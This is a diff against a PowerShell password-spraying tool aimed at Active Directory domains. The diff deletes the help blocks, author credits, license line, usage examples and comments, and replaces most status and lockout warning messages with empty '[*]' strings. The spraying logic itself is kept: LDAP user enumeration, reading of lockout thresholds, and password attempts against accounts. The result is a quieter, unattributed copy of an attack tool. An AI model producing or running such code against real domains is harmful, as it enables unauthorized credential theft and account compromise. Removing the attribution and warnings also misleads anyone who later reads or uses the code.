@@ -1,84 +1,5 @@
 function Invoke-DomainPasswordSpray{
-    <#
-    .SYNOPSIS
-
-    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
-
-    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
-    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-
-    .DESCRIPTION
-
-    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
-
-    .PARAMETER UserList
-
-    Optional UserList parameter. This will be generated automatically if not specified.
-
-    .PARAMETER Password
-
-    A single password that will be used to perform the password spray.
-
-    .PARAMETER PasswordList
-
-    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
-
-    .PARAMETER OutFile
-
-    A file to output the results to.
-
-    .PARAMETER Domain
-
-    The domain to spray against.
-
-    .PARAMETER Filter
-
-    Custom LDAP filter for users, e.g. "(description=*admin*)"
-
-    .PARAMETER Force
-
-    Forces the spray to continue and doesn't prompt for confirmation.
-
-    .PARAMETER Fudge
-
-    Extra wait time between each round of tests (seconds).
-
-    .PARAMETER Quiet
-
-    Less output so it will work better with things like Cobalt Strike
-
-    .PARAMETER UsernameAsPassword
-
-    For each user, will try that user's name as their password
-
-    .EXAMPLE
-
-    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
-
-    Description
-    -----------
-    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
-
-    .EXAMPLE
-
-    C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
-
-    Description
-    -----------
-    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
-
-    .EXAMPLE
-
-    C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt
-
-    Description
-    -----------
-    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt
-
-    #>
+   
     param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
@@ -150,7 +71,6 @@ function Invoke-DomainPasswordSpray{
     {
         if ($Domain -ne "")
         {
-            # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
@@ -164,7 +84,7 @@ function Invoke-DomainPasswordSpray{
     }
     catch
     {
-        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
+        Write-Host -ForegroundColor "red" "[*]"
         break
     }
 
@@ -175,8 +95,8 @@ function Invoke-DomainPasswordSpray{
     else
     {
         # if a Userlist is specified use it and do not check for lockout thresholds
-        Write-Host "[*] Using $UserList as userlist to spray with"
-        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
+        Write-Host "[*]"
+        Write-Host -ForegroundColor "yellow" "[*]"
         $UserListArray = @()
         try
         {
@@ -193,15 +113,14 @@ function Invoke-DomainPasswordSpray{
 
     if ($Passwords.count -gt 1)
     {
-        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
+        Write-Host -ForegroundColor Yellow "[*]"
     }
 
     $observation_window = Get-ObservationWindow $CurrentDomain
 
-    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
-    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+    Write-Host -ForegroundColor Yellow "[*]"
+    Write-Host "[*] Setting a $observation_window minute wait."
 
-    # if no force flag is set we will ask if the user is sure they want to spray
     if (!$Force)
     {
         $title = "Confirm Password Spray"
@@ -219,12 +138,12 @@ function Invoke-DomainPasswordSpray{
 
         if ($result -ne 0)
         {
-            Write-Host "Cancelling the password spray."
+            Write-Host ""
             break
         }
     }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $Passwords.count " passwords"
-    Write-Host "[*] This might take a while depending on the total number of users"
+    Write-Host -ForegroundColor Yellow "[*]"
+    Write-Host "[*]"
 
     if($UsernameAsPassword)
     {
@@ -242,10 +161,10 @@ function Invoke-DomainPasswordSpray{
         }
     }
 
-    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+    Write-Host -ForegroundColor Yellow "[*]"
     if ($OutFile -ne "")
     {
-        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+        Write-Host -ForegroundColor Yellow "[*] $OutFile"
     }
 }
 
@@ -253,7 +172,7 @@ function Countdown-Timer
 {
     param(
         $Seconds = 1800,
-        $Message = "[*] Pausing to avoid account lockout.",
+        $Message = "[*]",
         [switch] $Quiet = $False
     )
     if ($quiet)
@@ -272,54 +191,7 @@ function Countdown-Timer
 
 function Get-DomainUserList
 {
-<#
-    .SYNOPSIS
 
-    This module gathers a userlist from the domain.
-
-    DomainPasswordSpray Function: Get-DomainUserList
-    Author: Beau Bullock (@dafthack)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-
-    .DESCRIPTION
-
-    This module gathers a userlist from the domain.
-
-    .PARAMETER Domain
-
-    The domain to spray against.
-
-    .PARAMETER RemoveDisabled
-
-    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))
-
-    .PARAMETER RemovePotentialLockouts
-
-    Removes accounts within 1 attempt of locking out.
-
-    .PARAMETER Filter
-
-    Custom LDAP filter for users, e.g. "(description=*admin*)"
-
-    .EXAMPLE
-
-    PS C:\> Get-DomainUserList
-
-    Description
-    -----------
-    This command will gather a userlist from the domain including all samAccountType "805306368".
-
-    .EXAMPLE
-
-    C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
-
-    Description
-    -----------
-    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
-
-    #>
     param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
@@ -360,12 +232,12 @@ function Get-DomainUserList
         break
     }
 
-    # Setting the current domain's account lockout threshold
+  
     $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
     $AccountLockoutThresholds = @()
     $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold
 
-    # Getting the AD behavior version to determine if fine-grained password policies are possible
+   
     $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
     if ($behaviorversion -ge 3)
     {
@@ -381,8 +253,6 @@ function Get-DomainUserList
             Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
             foreach($entry in $PSOs)
             {
-                # Selecting the lockout threshold, min pwd length, and which
-                # groups the fine-grained password policy applies to
                 $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                 $PSOPolicyName = $PSOFineGrainedPolicy.name
                 $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
@@ -398,9 +268,7 @@ function Get-DomainUserList
 
     $observation_window = Get-ObservationWindow $CurrentDomain
 
-    # Generate a userlist from the domain
-    # Selecting the lowest account lockout threshold in the domain to avoid
-    # locking out any accounts.
+   
     [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
     Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
 
@@ -442,9 +310,6 @@ function Get-DomainUserList
     $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
     $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null
 
-    #Write-Host $UserSearcher.filter
-
-    # grab batches of 1000 in results
     $UserSearcher.PageSize = 1000
     $AllUserObjects = $UserSearcher.FindAll()
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
@@ -564,8 +429,6 @@ function Invoke-SpraySinglePassword
 
 function Get-ObservationWindow($DomainEntry)
 {
-    # Get account lockout observation window to avoid running more than 1
-    # password spray per observation window.
     $DomainEntry = [ADSI]$DomainEntry
     $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
     $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
